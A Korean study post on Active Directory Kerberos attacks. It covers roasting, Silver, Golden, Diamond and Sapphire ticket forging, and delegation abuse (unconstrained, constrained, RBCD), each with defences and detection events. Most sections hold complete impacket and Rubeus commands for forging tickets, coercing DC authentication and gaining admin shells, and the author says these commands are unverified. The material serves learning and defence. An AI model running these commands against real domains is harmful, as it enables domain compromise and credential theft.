---
title: "AD 심화 — Kerberos 티켓 위조와 위임 공격 완성"
description: "Kerberoasting부터 Silver·Golden·Diamond·Sapphire 티켓 위조와 Unconstrained/Constrained/RBCD 위임까지 Kerberos 공격 체인을 조건·명령·탐지로 정리합니다."
tags:
  - ActiveDirectory
  - Kerberos
  - 위임
  - Rubeus
  - impacket
  - 하드닝
  - OSCP
---

> [!warning] 허가된 환경에서만 실습하세요
> Silver·Golden·Diamond Ticket은 **krbtgt 또는 서비스 계정의 장기 비밀키**를
> 공격자가 쥔 결과이므로, 발급 후 **비밀번호를 리셋해도 이미 만든 티켓은
> 생애주기(기본 10시간, 최대 7일) 내내 유효**합니다. 랩이 아닌 환경에서는
> `krbtgt 2회 리셋`과 `임의 서비스 계정의 비밀번호 전수 교체` 비용을 먼저
> 합의한 뒤에만 실습하세요. 테스트 중 발급한 모든 TGT/TGS의 UPN·클라이언트
> 이름·발급 시각을 보고서에 남기는 것이 원칙입니다.

> [!summary] ⏱️ 5초 핵심 요약
> - **한 줄 비유**: Kerberos는 **"회사 출입카드 발급기"**입니다. 공격자는
>   ① 발급기에서 **일반 직원 카드**를 받아 해독하고(Kerberoasting), ②
>   **각 문의 자물쇠 복제키**(서비스 키)로 **임의 이름이 박힌 카드**를 찍거나
>   (Silver Ticket), ③ 발급기 **마스터 서명 키**(krbtgt)로 **모든 카드**를
>   찍거나(Golden/Diamond Ticket), ④ **다른 사람 대신 발급받는 대리권**(S4U,
>   위임)으로 관리자 카드를 받아냅니다.
> - **핵심 원리**: Kerberos의 보안은 **각 티켓이 "대상 서비스 또는 krbtgt의
>   장기 키"로 암호화·서명**되어 있다는 점에 기댑니다. 이 키 중 하나라도 공격자
>   손에 들어가면 **티켓 "위조"**가 성립하며, **DC는 자신이 발급하지 않은
>   티켓도 서명만 맞으면 수락**합니다(PAC 검증은 TGT 자체에선 느슨, S4U/
>   서비스 간 상호 검증에서만 강제).
> - **놓치기 쉬운 곳**: ① **MachineAccountQuota ≥ 1**이면 아무 도메인 사용자가
>   머신 계정을 추가해 RBCD 공격의 "SPN을 가진 가짜 계정"을 만들 수 있음.
>   ② **Unconstrained Delegation 서버**는 접근한 특권 사용자의 **TGT 전체**를
>   메모리에 캐시함. ③ Diamond/Sapphire Ticket은 **기존 유효 TGT를 변조**하므로
>   Golden Ticket처럼 "없는 세션키"로 보이지 않아 탐지가 어렵습니다.
> - **근본 조치**: **krbtgt 2회(24시간 이상 간격) 리셋 + Protected Users
>   그룹 + Authentication Policy Silo + `ms-DS-MachineAccountQuota = 0` +
>   AES-only 강제 + S4U·4769·4624 로그 상관 + 위임 ACE(`TRUSTED_TO_AUTH_FOR_
>   DELEGATION`, `msDS-AllowedToActOnBehalfOfOtherIdentity`) 상시 감사**.

[[AD 환경 Kerberos 체인 공격 — 위임 남용과 토큰 가장으로 DC 장악|Kerberos
체인 공격]]에서 "Kerberoasting → Constrained Delegation → SeImpersonate"로
이어지는 대표 체인을 다뤘고, [[AD 심화 — 강제 인증과 릴레이의 이해와 방어|
강제 인증·릴레이]]에서는 "자격증명 없이 다른 계정의 인증을 중간에서 훔치는"
경로를 다뤘습니다. 이 글은 **티켓 그 자체를 공격자가 만들거나 변조하는
단계(Silver/Golden/Diamond/Sapphire)**와 **Unconstrained/Constrained/RBCD
위임의 미세한 조건 차이**를 하나로 묶습니다. AD 기본 구조는
[[공격 체인 이전의 AD 아키텍처 기초 — Kerberos, NTLM, DACL·ACE, GPO·SYSVOL, 도메인 트러스트|AD 아키텍처 기초]]를 참고하세요.

모든 명령은 플레이스홀더(`<domain>`, `<dc>`, `<user>`, `<spn>`)로 일반화했고
예시 도메인은 `corp.local`, IP는 `10.0.0.0/24` 사설 대역입니다. 이 PC에서는
도메인 랩을 돌릴 수 없어 **도구 옵션과 문법은 공식 README·문서 기준으로
썼으며 실행 결과 자체는 미검증**입니다. certipy·rubeus·impacket은 버전별
옵션 명칭이 바뀔 수 있으므로 **`-h`로 재확인**하세요. 재현은 아래 "실습
환경" 절의 공개 랩에서 하세요.

---

## 한눈에 보는 Kerberos 공격 요약표

| 기법 | 필요 조건 | 얻는 것 | 끊어야 할 방어 지점 |
|---|---|---|---|
| **Kerberoasting** | 도메인 사용자 1인 + SPN 등록 서비스 계정 존재 + RC4 또는 약한 AES 키 | 서비스 계정 평문 비밀번호 | AES-only, gMSA, 25자+ 복잡 비밀번호 |
| **AS-REP Roasting** | 대상 계정의 `DONT_REQ_PREAUTH` 플래그 | 비밀번호 해시(오프라인 크랙) | 모든 계정의 Pre-auth 활성, 약한 계정 식별 |
| **Targeted Kerberoast** | 공격자가 대상 사용자 객체의 **`servicePrincipalName` 쓰기 ACE** 보유 | 임의 사용자에 SPN을 심어 Kerberoast | SPN 쓰기 ACE 최소화 |
| **Silver Ticket** | 서비스 계정의 **NT/AES 키** + 대상 SPN | 해당 서비스에 임의 사용자로 인증되는 TGS | AES-only, 서비스 계정 키 보호, PAC 검증 강제 |
| **Golden Ticket** | **krbtgt NT/AES 키** + 도메인 SID | 도메인 어떤 사용자로도 유효한 TGT | krbtgt 2회 리셋, 탐지(4769 krbtgt 이상) |
| **Diamond Ticket** | 유효 TGT 1개 + krbtgt 키 | **정상 TGT를 변조해 PAC 교체** — 탐지 우회 | Golden Ticket과 동일 + PAC 서명 검증 |
| **Sapphire Ticket** | S4U2self + U2U 기법으로 **정상 발급 흐름을 통해 특권 PAC 획득** | 완전 정상 세션키·시간 범위의 TGT | S4U2self 로깅, Diamond과 동일 방어 |
| **Unconstrained Delegation** | 대상 서버의 `TRUSTED_FOR_DELEGATION` + 특권 사용자가 그 서버에 인증 | 피해자 TGT 전체(메모리 캐시) | Protected Users, Unconstrained 사용 최소화 |
| **Constrained Delegation (S4U)** | 서비스 계정의 `msDS-AllowedToDelegateTo` + `TRUSTED_TO_AUTH_FOR_DELEGATION` | 임의 사용자로 특정 SPN 접근 | AllowedToDelegateTo 최소화, Protected Users |
| **RBCD** | 대상 머신 객체의 `msDS-AllowedToActOnBehalfOfOtherIdentity` 쓰기 + SPN 있는 계정 1개 | 대상 머신에 임의 사용자로 인증 | 머신 객체 ACL 하드닝, `ms-DS-MachineAccountQuota=0` |

> [!important] 숫자 대신 "키 소유권"으로 외우세요
> Kerberos 공격의 모든 변종은 **"어느 키를 쥐었느냐"**로 정리됩니다.
> 서비스 키 → Silver, krbtgt 키 → Golden/Diamond, 내가 쥔 키로 "대신 요청"
> 할 권리 → S4U·위임. 키 자체는 못 훔쳐도 **서명 흐름에 끼어들 수 있는
> ACE**를 쥐면 그 자리에 등가입니다.

---

## 1. 요약으로만 다루는 전통 3대(기존 글과 중복)

[[AD 환경 Kerberos 체인 공격 — 위임 남용과 토큰 가장으로 DC 장악|Kerberos
체인 공격]] 글에 상세 흐름이 있어 여기서는 체크리스트만 남깁니다.

### 1.1 Kerberoasting 체크리스트

- [ ] 유효 도메인 계정 1개 확보 (`impacket-getTGT`)
- [ ] `impacket-GetUserSPNs -request` 또는 `Rubeus kerberoast` 로 TGS 수집
- [ ] 암호화 타입 `$krb5tgs$23$` (RC4) 는 즉시 크랙 후보, `$krb5tgs$17/18$`
      (AES128/256) 은 사전이 작을 때만 성공
- [ ] `hashcat -m 13100`(RC4) / `-m 19700`(AES256) — hashcat 모드 번호는
      **공식 Wiki 재확인**
- [ ] 방어: 서비스 계정을 **gMSA로 전환**, AES-only, 25자 이상, SPN 사용처만 등록

### 1.2 AS-REP Roasting 체크리스트

- [ ] `useraccountcontrol` 에 `DONT_REQ_PREAUTH`(0x400000) 가 켜진 사용자
      식별: `impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc>`
      또는 `Rubeus asreproast`
- [ ] 결과 `$krb5asrep$23$` → `hashcat -m 18200`
- [ ] 방어: 모든 계정에서 Pre-auth 활성 상태 유지. 레거시 호환 사유로
      예외 처리된 계정이 있다면 별도 Tier로 감시

### 1.3 Targeted Kerberoast 체크리스트

- [ ] 대상 사용자 객체에 공격자(또는 공격자가 속한 그룹)의
      `WriteProperty(servicePrincipalName)` ACE 확인 — BloodHound edge
      `WriteSPN`
- [ ] 임시 SPN 심기: `impacket-targetedKerberoast.py -u <user>@<domain>`
      (또는 `Rubeus kerberoast /user:<victim> /spn:dummy/host`)
- [ ] TGS 수집 후 **반드시 SPN 원복** — 흔적 복구 책임
- [ ] 방어: `User` 객체의 `servicePrincipalName` 쓰기 ACE를 Domain Admins·
      Account Operators 등으로 제한

- 출처: [harmj0y — Kerberoasting Revisited](https://blog.harmj0y.net/activedirectory/roasting-as-reps/), [Rubeus README](https://github.com/GhostPack/Rubeus), [impacket README](https://github.com/fortra/impacket)

---

## 2. Silver Ticket — 서비스 키로 TGS를 직접 찍기

### 2.1 원리

Kerberos에서 **서비스 TGS는 그 서비스 계정의 장기 비밀키(NT 또는 AES 키)로
암호화**되어 서비스에 전달됩니다. 공격자가 그 키를 쥐면 DC를 거치지 않고
**TGS 자체를 로컬에서 만들어** 서비스에 제출할 수 있습니다. 서비스는 자신의
키로 복호화가 성공하고 PAC 서명(ServerSignature)이 자기 키로 검증되므로
**정상 요청과 구분하지 못합니다**.

핵심은 **PAC 검증 조건**입니다. PAC에는 두 개의 서명(ServerSignature,
KDCSignature)이 있는데, **대부분의 서비스는 ServerSignature(서버 키)만
검증**하고 KDCSignature(krbtgt 키)는 검증하지 않습니다. 이 때문에 Silver
Ticket은 krbtgt 키 없이도 만들어집니다. 다만 **S4U2Self / S4U2Proxy** 흐름,
일부 최신 Windows 서비스, Protected Users 설정 하에서는 KDC 서명까지 검증
또는 PAC Validation 요청이 발생해 실패할 수 있습니다.

### 2.2 성립 조건

- 대상 서비스 계정의 **NT 해시 또는 AES256/AES128 키** (DCSync·secretsdump·
  SAM 덤프·Kerberoast 크랙 중 하나로 획득)
- 대상 SPN 정확한 포맷 (`cifs/host.corp.local`, `mssqlsvc/sql01.corp.local:1433`,
  `http/web.corp.local` 등)
- 도메인 SID (BloodHound, `Get-ADDomain`, `impacket-lookupsid`)
- 공격자와 대상 서비스 간 시계 차이 < 5분

### 2.3 명령

**impacket (`ticketer.py`)**:

```bash
# 머신 계정 cifs 서비스에 대한 Silver Ticket (administrator 가장)
impacket-ticketer \
  -domain corp.local \
  -domain-sid S-1-5-21-xxxx-xxxx-xxxx \
  -spn cifs/host01.corp.local \
  -nthash <service-account-NT> \
  administrator

# AES256 키를 쓸 때
impacket-ticketer \
  -domain corp.local \
  -domain-sid S-1-5-21-xxxx-xxxx-xxxx \
  -spn cifs/host01.corp.local \
  -aesKey <service-account-AES256> \
  administrator

export KRB5CCNAME=administrator.ccache
impacket-smbexec -k -no-pass administrator@host01.corp.local
```

**Rubeus (Windows 측)**:

```powershell
# PS로 Silver Ticket 발급 후 cifs 접근
.\Rubeus.exe silver /service:cifs/host01.corp.local `
  /rc4:<NT> /user:administrator /domain:corp.local `
  /sid:S-1-5-21-xxxx-xxxx-xxxx /ptt
```

`ticketer`의 주요 옵션:

| 옵션 | 뜻 |
|---|---|
| `-domain-sid` | 도메인 SID — 반드시 **5-21 접두** 그대로 |
| `-spn` | 발급할 서비스 SPN — **서비스 이름/호스트 FQDN** |
| `-nthash` / `-aesKey` | 서비스 계정 키. AES 환경에서 RC4 티켓을 보내면 **거부**될 수 있음 |
| `-user-id` | 티켓 PAC에 심을 **RID**(기본 500 = Administrator) |
| `-groups` | PAC에 심을 그룹 SID (기본 Domain Admins·Enterprise Admins·Schema Admins) |
| `-duration` | 티켓 생애주기(일) |
| `-extra-pac` | 추가 PAC 확장 — 검증 우회용 세부 옵션 |

### 2.4 S4U와 Silver Ticket의 교차

Silver Ticket으로 만든 TGS는 **대상 서비스에만** 유효합니다. 그 서비스가
다시 다른 백엔드(예: SQL → File Server)로 Kerberos 위임을 하는 경우,
**TGS에 설정된 "forwardable" 비트와 서비스의 위임 설정**이 맞아야 전진이
가능합니다. 또한 **S4U2Self로 발급받은 TGS를 S4U2Proxy로 전환**할 때는 **KDC
가 PAC의 KDC 서명까지 검증**하므로 **Silver Ticket만으로는 체인이 끊어질
수** 있습니다(이 때문에 공격자는 Golden/Diamond로 상향합니다).

### 2.5 방어

- **AES-only 강제** — `msDS-SupportedEncryptionTypes` 를 AES128/256 플래그
  (0x18)로. RC4 티켓 전면 거부.
- **Protected Users** 그룹 사용 — 이 그룹은 RC4/NTLM 불가, 위임 금지, TGT
  수명 단축.
- **서비스 계정의 NT 해시 유출 경로 봉쇄** — DCSync 권한 최소화, LSASS 보호
  (Credential Guard, LSA Protection RunAsPPL).
- **PAC Validation 강제** 설정 — 고가치 서비스는 ServerSignature 외에 KDC
  서명까지 검증하도록 구성.

### 2.6 탐지

- Event 4624 (서비스 로그온) 중 **TGT 요청(4768) 없이** 바로 TGS 사용(4769)
  이 발생하는 비정상 패턴
- Event 4769 의 **`Ticket Encryption Type = 0x17 (RC4)`** 가 AES 환경에서
  갑자기 증가
- 서비스 측에서 **KDC 서명 검증 실패** 로그 (서비스별 이벤트, Windows
  Security 4768/4769 상관)

- 출처: [harmj0y — The Delegation Explosion (Silver/Golden 체계 설명 포함)](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d9), [SpecterOps — Kerberos & Attacks 101](https://posts.specterops.io/), [Microsoft — Kerberos Protection](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)

---

## 3. Golden Ticket — krbtgt 키로 TGT를 직접 찍기

### 3.1 원리

TGT는 **krbtgt 계정의 NT/AES 키로 암호화·서명**됩니다. 공격자가 krbtgt
해시를 쥐면 **임의의 사용자명·그룹·SID로 TGT를 로컬에서 만들어** DC에
제출할 수 있고, DC는 자기 키로 복호화 성공하므로 정상 TGT로 처리합니다.
Silver와 달리 **모든 서비스**에 대한 TGS를 발급받을 수 있고, **도메인 내 어떤
계정으로도 가장** 가능합니다.

### 3.2 성립 조건

- **krbtgt NT 해시 또는 AES256 키** — DCSync, 사전 DC 침해, 백업 미디어
  복구로 획득
- 도메인 SID
- 공격자가 요청을 보낼 DC와의 시계 차이 < 5분
- 티켓 수명은 공격자가 지정(기본 10h, 최대 10년까지 지정 가능 — 단, DC
  정책이 5년 이상은 거부하는 경우가 있음)

### 3.3 명령

```bash
# impacket - Golden Ticket
impacket-ticketer \
  -domain corp.local \
  -domain-sid S-1-5-21-xxxx-xxxx-xxxx \
  -nthash <krbtgt-NT> \
  administrator
# 서비스 없이(-spn 미지정) = krbtgt 대상 TGT

export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local \
  -just-dc-ntlm
```

```powershell
# Rubeus - Golden Ticket
.\Rubeus.exe golden /aes256:<krbtgt-AES256> `
  /user:administrator /domain:corp.local `
  /sid:S-1-5-21-xxxx-xxxx-xxxx /ptt /endin:600 /renewmax:10080
```

| 옵션 | 뜻 |
|---|---|
| `/endin` | 티켓 생애주기(분) |
| `/renewmax` | 갱신 가능 최대(분) — 기본 10080 (7일) |
| `/groups` | PAC에 넣을 그룹 RID (기본 512/513/518/519/520) |
| `/sids` | **ExtraSids** — 다른 도메인 SID를 넣어 **SID History 방식의 Forest 가로지르기** |

### 3.4 Forest 경계 가로지르기 (SID History 공격)

Golden Ticket의 `/sids` 옵션에 **부모 Forest의 Enterprise Admins SID**를
넣으면 자식 도메인의 krbtgt 키만 있어도 **Forest 루트 도메인에 Enterprise
Admins로 인증**될 수 있었습니다. 2017년 이후 패치(MS16-101 계열,
`FilterSIDs`)로 완화되었으나 모든 조직이 끄지 않은 레거시 환경에서는
여전히 성립합니다. 즉 **Forest 보안 경계** 원칙에 금이 가는 경로입니다.

### 3.5 방어

- **krbtgt 비밀번호 2회(24시간 이상 간격) 리셋** — 1회 리셋 시 "N-1" 키가
  유효해서 공격자가 발급한 티켓이 남습니다. [Microsoft 공식 스크립트
  `Reset-KrbTgt-Password-For-RWDCs-And-RODCs.ps1`](https://github.com/microsoft/New-KrbtgtKeys.ps1)
  사용.
- **krbtgt 비밀번호 수명 모니터링** — 180일 초과 시 자동 알람.
- **AES-only** — 모든 Golden Ticket 공격에서 AES만 허용하면 공격자는 AES
  키를 알아야 하므로 난이도 상승(주로 NTDS.dit 전체 유출 필요).
- **Protected Users / Authentication Policy Silo** — Tier-0 계정은 NTLM
  불가, 위임 불가, TGT 4시간 수명.
- **DC 로컬 보안 — Credential Guard, LSA Protection, 백업 암호화**.

### 3.6 탐지

- Event 4769 의 **`Account Name = krbtgt`** 는 정상적으로는 거의 없음.
  "krbtgt" 자체가 서비스 대상이 되는 요청(=TGS 재발급 흐름의 일부) 외에는
  **급증하면 Golden Ticket 재사용 신호**.
- **TGT 수명이 비정상**(> 10h 또는 renew가 10080분보다 길게 설정) — DC
  정책과 비교.
- **PAC에 모순**(RID 500 인데 로그온한 머신 계정이 workstation) — 상관
  분석 필요.
- BloodHound CE의 `HasSession` 과 Event 4624 상관으로 TGT 수명 이상치 식별.

- 출처: [Benjamin Delpy — Mimikatz Kerberos 섹션](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos), [Microsoft — krbtgt 재설정 가이드](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-forest-recovery-reset-krbtgt), [Sean Metcalf — Golden Ticket 분석](https://adsecurity.org/?p=1640)

---

## 4. Diamond Ticket과 Sapphire Ticket — 탐지 회피형

### 4.1 Diamond Ticket

**원리**: Golden Ticket은 **공격자가 완전히 날조한 TGT**라서 세션키·시간
범위·renew 카운터 등이 **DC가 발급한 흔적과 조금씩 다릅니다**. Diamond
Ticket은 **DC에서 정상적으로 발급받은 유효 TGT**를 가져온 뒤 krbtgt 키로
**복호화 → PAC(그룹/SID/UPN) 교체 → 재암호화**합니다. 세션키와 시간 범위는
정상 발급 흐름을 유지하므로 **TGT 수명·발급 시각 이상치 탐지를 우회**합니다.

**조건**:
- krbtgt 키 (Golden과 동일)
- 유효한 TGT 1개 (공격자 자신의 것도 가능)

**명령 (Rubeus)**:

```powershell
# 1) 본인 TGT 확보 (평소처럼 로그온 또는 getTGT)
.\Rubeus.exe asktgt /user:<attacker> /password:<pw> /domain:corp.local /nowrap

# 2) Diamond 변조 - 본인 TGT를 입력받아 PAC만 교체
.\Rubeus.exe diamond `
  /tgtdeleg `
  /ticketuser:<attacker> /ticketuserid:1104 `
  /newuser:administrator /newuserid:500 `
  /groups:512,513,518,519,520 `
  /krbkey:<krbtgt-AES256> `
  /ptt
```

`/tgtdeleg`는 **현재 세션의 TGT**를 `S4U2Self + U2U` 요청으로 가져오는
방식입니다. krbtgt 키가 있으므로 그걸로 PAC을 재서명합니다.

### 4.2 Sapphire Ticket

**원리**: Diamond가 "변조"였다면 Sapphire는 **아예 DC에게 "정상적으로"
특권 PAC을 발급받는 흐름**입니다. 2022년 발표된 기법(Charlie Clark /
SpecterOps 계열)에서는 **S4U2Self + U2U(User-to-User)** 조합으로 자신이
가진 사용자 세션에 **그룹 PAC을 DC가 직접 채운 티켓**을 발급받습니다. 결과
TGT는 **완전히 DC가 만든 것**이라 Diamond보다도 탐지가 어렵습니다.

**조건**:
- 공격자의 유효 TGT
- 공격자 계정이 **S4U2Self 가능한 조건**(기본적으로 머신 계정 또는 위임
  설정된 서비스 계정) — 단, Sapphire는 조건이 완화된 변형이 여러 가지
  있어 **버전별 README 확인 필수**

**명령 (Rubeus, 개념 수준)**:

```powershell
# Rubeus의 s4u 명령으로 U2U + S4U2Self 조합 — 정확한 하위 옵션은
# 버전마다 바뀌었으므로 /h 로 재확인
.\Rubeus.exe s4u /self /u2u /impersonateuser:administrator `
  /user:<attacker-machine$> /aes256:<attacker-aes> `
  /altservice:cifs/dc01.corp.local /nowrap /ptt
```

### 4.3 두 기법의 방어·탐지

- **방어 측면**은 Golden Ticket과 동일. krbtgt 2회 리셋, Protected Users,
  AES-only.
- **탐지 측면**은 더 까다롭습니다. **4769 이벤트의 "Service Name = krbtgt"
  빈도**, **S4U2Self 호출 빈도**, **동일 세션에서 TGT가 짧은 시간에 여러
  번 재발급**되는 패턴을 상관으로 봐야 합니다.
- Microsoft Defender for Identity(MDI)는 "Suspected skeleton key attack",
  "Suspected Golden Ticket usage"를 Diamond에도 일부 확장해 탐지합니다.

- 출처: [Charlie Clark — Diamond & Sapphire Ticket](https://www.semperis.com/blog/a-diamond-and-a-sapphire/), [SpecterOps — Rubeus Diamond](https://github.com/GhostPack/Rubeus), [Microsoft Defender for Identity — Golden Ticket 탐지](https://learn.microsoft.com/en-us/defender-for-identity/)

---

## 5. 위임 심화 — Unconstrained / Constrained / RBCD

### 5.1 Unconstrained Delegation

**원리**: 서버 객체의 `userAccountControl`에 `TRUSTED_FOR_DELEGATION`
(0x80000) 비트가 켜지면, 그 서버는 **자신에게 Kerberos 인증한 사용자의 TGT
전체**를 받아 LSASS에 캐시합니다. 공격자가 그 서버에 로컬 관리자면 피해자
TGT를 그대로 뽑아 어디든 가장할 수 있습니다. 심지어 공격자가 **임의 호스트를
"프린터"로 만들고 DC가 그 호스트로 인증하게 하면(PrinterBug)** DC 머신
계정의 TGT를 획득합니다.

**조건**:
- 서버 객체에 `TRUSTED_FOR_DELEGATION` (BloodHound: `Unconstrained=true`)
- 공격자가 그 서버에 코드 실행 또는 로컬 관리자 권한
- 피해자 특권 계정이 **그 서버에 Kerberos로 인증**(강제 인증 가능)

**명령**:

```powershell
# 서버에서 Rubeus monitor - TGT 캐시 수집
.\Rubeus.exe monitor /interval:5 /nowrap

# 다른 터미널에서 피해자를 강제 인증 (PetitPotam / PrinterBug)
# 예: SpoolSample.py로 DC가 공격 서버로 연결하게 유도
```

```bash
# 리눅스에서 PetitPotam
impacket-petitpotam.py -u <user> -p '<pw>' -d corp.local \
  <attacker-ip> <dc-ip>
```

**방어**:
- **Protected Users** 그룹 사용 — 이 그룹의 TGT는 forwardable 비트 금지
- 서버 객체의 `userAccountControl`에서 `TRUSTED_FOR_DELEGATION` 제거
- 대안으로 **Kerberos Constrained Delegation with Protocol Transition**
  (CD w/ PT) 사용

### 5.2 Constrained Delegation (CD) with Protocol Transition (S4U)

**원리**: `msDS-AllowedToDelegateTo`에 열거된 **SPN 목록에 한해** 서비스가
다른 사용자를 가장할 수 있습니다. 두 단계 흐름:

1. **S4U2Self** — 서비스가 **자기 자신에게 임의 사용자의 TGS**를 발급받음
   (`TRUSTED_TO_AUTH_FOR_DELEGATION` 가 켜져 있으면 비밀번호 없이 가능).
2. **S4U2Proxy** — 그 TGS를 증거로 삼아 **대상 SPN에 그 사용자의 TGS**를
   발급받음.

**조건**:
- 공격자가 쥔 서비스 계정에 `msDS-AllowedToDelegateTo` 가 **비어있지
  않음**
- `TRUSTED_TO_AUTH_FOR_DELEGATION` (0x1000000, aka Protocol Transition)
  가 켜져 있으면 비밀번호 없이 S4U2Self 가능. 꺼져 있으면 피해자의
  비밀번호 또는 유효 TGT가 있어야 S4U2Proxy 성공.

**명령 (impacket)**:

```bash
# 사전 열거 (findDelegation)
impacket-findDelegation corp.local/<user> -dc-ip 10.0.0.10

# S4U2Self + S4U2Proxy 한 흐름으로
impacket-getST -spn cifs/target.corp.local \
  -impersonate administrator \
  corp.local/<svc-account>:'<pw>' -dc-ip 10.0.0.10

# 또는 서비스 계정 NT 해시만으로
impacket-getST -spn cifs/target.corp.local \
  -impersonate administrator -hashes :<svc-NT> \
  corp.local/<svc-account> -dc-ip 10.0.0.10

export KRB5CCNAME=administrator.ccache
impacket-smbexec -k -no-pass administrator@target.corp.local
```

| 옵션 | 뜻 |
|---|---|
| `-spn` | **CD 설정상 허용된** SPN 중 하나. 리스트에 없는 SPN은 KDC가 거부 |
| `-impersonate` | 가장할 사용자명 (보통 `administrator` 또는 DC 가장을 위해 `dc01$`) |
| `-altservice` | S4U2Proxy 응답 티켓의 SPN을 다른 서비스로 **재작성** — 많은 CD 환경에서 **SPN 하나에만 위임돼 있어도 "altservice"로 다른 프로토콜 서비스에 접근**이 가능해지는 2018 Shamir 기법 |

### 5.3 Resource-Based Constrained Delegation (RBCD)

**원리**: 2012R2 이후 도입된 "자원 측" 위임. 기존 CD가 **서비스 쪽에서
AllowedToDelegateTo**로 허용 대상을 적었다면, RBCD는 **자원(대상 머신)
쪽에서 `msDS-AllowedToActOnBehalfOfOtherIdentity`에 "누구를 받아들일지"**를
적습니다. **공격자가 대상 머신 객체의 그 속성을 쓸 수 있으면**, 자기가
가진 임의의 SPN 보유 계정으로 그 머신에 S4U 체인을 돌릴 수 있습니다.

**가장 자주 보이는 성립 조건 체인**:
1. `ms-DS-MachineAccountQuota` ≥ 1 (기본 10)
2. 공격자가 아무 도메인 사용자 → **머신 계정을 새로 추가**(`addcomputer.py`)
3. 새 머신 계정 → 자동으로 SPN 보유 + 공격자가 비밀번호 앎
4. 대상 머신 객체의 `msDS-AllowedToActOnBehalfOfOtherIdentity`에 새 머신
   SID로 ACE 추가(공격자가 그 객체의 쓰기 ACE 보유 시)
5. `impacket-getST -impersonate administrator` 로 S4U → 대상 머신에
   administrator로 접속

**명령**:

```bash
# 1. 머신 계정 추가 (MAQ 활용)
impacket-addcomputer.py -computer-name 'pwn$' \
  -computer-pass 'Summer2026!' \
  corp.local/<attacker>:'<pw>' -dc-host dc01.corp.local

# 2. 대상 머신에 RBCD 설정 (rbcd.py)
impacket-rbcd.py -delegate-from 'pwn$' \
  -delegate-to 'target$' -action write \
  corp.local/<attacker>:'<pw>' -dc-host dc01.corp.local

# 3. S4U로 티켓 발급 (RBCD는 Protocol Transition 없이도 가능)
impacket-getST -spn cifs/target.corp.local \
  -impersonate administrator \
  corp.local/'pwn$':'Summer2026!' -dc-ip 10.0.0.10

# 4. 접속
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass administrator@target.corp.local
```

**방어**:
- `ms-DS-MachineAccountQuota = 0` — 기본 10 을 **반드시 0**으로 (Microsoft
  권고). 도메인 가입 자동화 계정에만 별도 ACE 위임.
- 머신 객체의 `msDS-AllowedToActOnBehalfOfOtherIdentity` **쓰기 ACE 최소화**.
- 특히 머신의 "자기 자신에 대한 WriteDACL/GenericWrite/GenericAll"
  (BloodHound edge `GenericAll on Computer` → `AddAllowedToAct`) 감시.

### 5.4 `msDS-AllowedToDelegateTo`와 RBCD 조합

CD와 RBCD는 상호 배타적이지 않습니다. 다음과 같은 **합성 체인**이 가능합니다:

| 체인 | 설명 |
|---|---|
| `TRUSTED_TO_AUTH_FOR_DELEGATION` + CD → RBCD 재구성 | S4U2Self로 받은 "forwardable 아닌" TGS를 RBCD 대상이 수락 (Elad Shamir "Wagging the Dog"의 핵심 통찰) |
| 머신 A의 CD + 머신 B의 RBCD | 머신 A에서 S4U2Proxy로 받은 TGS를 다시 B에 가장 |
| `altservice` | CD의 AllowedToDelegateTo에 `cifs/host` 만 있어도 **S4U2Proxy의 응답 `sname`을 `http/host`로 재작성** 가능 — 많은 서비스 Kerberos는 이 재작성을 수락 |

- 출처: [harmj0y — The Delegation Explosion](https://posts.specterops.io/s4u2pwnage-5547921c0196), [Elad Shamir — Wagging the Dog](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html), [impacket `rbcd.py` README](https://github.com/fortra/impacket), [Microsoft — Constrained Delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview), [SpecterOps 블로그](https://posts.specterops.io/)

---

## 6. 티켓 형식 변환 — Rubeus / impacket 대응표

### 6.1 kirbi ↔ ccache

Kerberos 티켓은 Windows에서는 `.kirbi`(KRB_CRED 구조), 리눅스/MIT에서는
`.ccache`(Credential Cache 포맷)로 저장됩니다. 공격자는 종종 한쪽 도구로
얻은 티켓을 다른 쪽에서 써야 합니다.

**impacket — `ticketConverter.py`**:

```bash
# kirbi → ccache
impacket-ticketConverter administrator.kirbi administrator.ccache

# ccache → kirbi
impacket-ticketConverter administrator.ccache administrator.kirbi

export KRB5CCNAME=$PWD/administrator.ccache
```

**Rubeus**:

```powershell
# base64 인코딩된 kirbi를 PTT (Pass-the-Ticket)
.\Rubeus.exe ptt /ticket:<base64-kirbi>

# 현재 세션의 TGT 추출
.\Rubeus.exe dump /nowrap
```

### 6.2 기능별 대응표

| 기능 | impacket | Rubeus |
|---|---|---|
| TGT 요청(비밀번호) | `impacket-getTGT corp.local/user:pw` | `Rubeus asktgt /user:user /password:pw /domain:corp.local` |
| TGT 요청(해시) | `impacket-getTGT -hashes :<NT> corp.local/user` | `Rubeus asktgt /user:user /rc4:<NT>` |
| Kerberoast | `impacket-GetUserSPNs -request` | `Rubeus kerberoast` |
| AS-REP Roast | `impacket-GetNPUsers` | `Rubeus asreproast` |
| S4U2Self+Proxy | `impacket-getST -impersonate` | `Rubeus s4u /impersonateuser` |
| Silver Ticket | `impacket-ticketer -spn ...` | `Rubeus silver /service` |
| Golden Ticket | `impacket-ticketer`(SPN 미지정) | `Rubeus golden` |
| Diamond Ticket | — (미구현) | `Rubeus diamond` |
| Pass-the-Ticket | `export KRB5CCNAME=...` | `Rubeus ptt /ticket:` |
| 현재 세션 TGT 조회 | `klist` (MIT) | `Rubeus triage` / `klist` |

### 6.3 자주 나는 시간 동기화 오류 (KRB_AP_ERR_SKEW)

| 증상 | 원인 | 대응 |
|---|---|---|
| `KRB_AP_ERR_SKEW: Clock skew too great` | 공격자 ↔ DC 시계 차이 > 5분 | `rdate -n <dc>` / `ntpdate -q <dc>` / Windows `w32tm /resync` |
| Linux에서 티켓은 받는데 SMB가 거부 | 로컬 타임존 오차 | `timedatectl set-timezone UTC` 후 재발급 |
| `NTP 응답 없음` — AD에서 포트 123 UDP 차단 | 외부 NTP 사용 불가 | `w32tm /stripchart /computer:<dc>` 로 drift만 측정 후 수동 보정 |
